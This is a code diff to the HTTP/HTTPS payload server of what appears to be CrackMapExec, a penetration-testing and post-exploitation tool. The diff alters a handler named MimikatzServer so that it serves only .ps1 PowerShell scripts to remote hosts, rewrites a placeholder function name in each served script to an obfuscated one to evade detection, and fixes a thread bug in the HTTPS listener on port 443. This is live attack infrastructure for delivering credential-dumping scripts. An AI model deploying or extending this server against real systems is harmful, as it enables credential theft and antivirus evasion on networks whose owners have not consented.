@@ -5,8 +5,11 @@ from datetime import datetime
 from StringIO import StringIO
 import core.settings as settings
 import os
+import re
 import BaseHTTPServer
 import ssl
+
+func_name = re.compile('CHANGE_ME_HERE')
 
 class MimikatzServer(BaseHTTPRequestHandler):
 
@@ -14,11 +17,13 @@ class MimikatzServer(BaseHTTPRequestHandler):
         print_message("%s - - %s" % (self.client_address[0], format%args))
 
     def do_GET(self):
-        if self.path[5:] in os.listdir('hosted'):
+        if self.path[5:].endswith('.ps1') and self.path[5:] in os.listdir('hosted'):
             self.send_response(200)
             self.end_headers()
-            with open('hosted/'+ self.path[4:], 'r') as script:
-                self.wfile.write(script.read())
+            with open('hosted/'+ self.path[4:], 'rb') as script:
+                ps_script = script.read()
+                ps_script = func_name.sub(settings.args.obfs_func_name, ps_script)
+                self.wfile.write(ps_script)
 
         elif settings.args.path:
             if self.path[6:] == settings.args.path.split('/')[-1]:
@@ -64,8 +69,8 @@ def http_server():
     t.start()
 
 def https_server():
-    server = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), MimikatzServer)
-    server.socket = ssl.wrap_socket(server.socket, certfile='certs/crackmapexec.crt', keyfile='certs/crackmapexec.key', server_side=True)
-    t = Thread(name='https_server', target=http_server.serve_forever)
+    https_server = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), MimikatzServer)
+    https_server.socket = ssl.wrap_socket(https_server.socket, certfile='certs/crackmapexec.crt', keyfile='certs/crackmapexec.key', server_side=True)
+    t = Thread(name='https_server', target=https_server.serve_forever)
     t.setDaemon(True)
     t.start()
